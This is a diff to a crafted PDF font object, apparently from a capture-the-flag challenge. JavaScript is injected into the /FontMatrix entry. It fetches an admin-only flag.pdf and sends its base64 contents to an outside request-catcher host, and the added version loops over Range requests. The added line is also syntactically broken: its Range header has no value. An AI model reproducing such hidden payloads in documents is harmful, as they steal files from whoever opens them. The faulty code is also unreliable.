@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-fetch\('/app/admin/flag.pdf?a=a.css'\).then\(r=>r.arrayBuffer\(\)\).then\(b=>location.href='https://zhzrusg.request.dreamhack.games/?a='+btoa\(String.fromCharCode\(...new Uint8Array\(b\)\)\)\)
+\(async\(\)=>{for\(let o=0,b;o<1e6;o+=100\)b=await fetch\('/app/admin/flag.pdf',{headers:{Range:}}\).then\(r=>r.ok?r.arrayBuffer\(\):null\),b&&location.href='https://zhzrusg.request.dreamhack.games/?a='+btoa\(String.fromCharCode\(...new Uint8Array\(b\)\)\)}\)\(\);
 //)]
 /Subtype/Type1
 /FirstChar 65
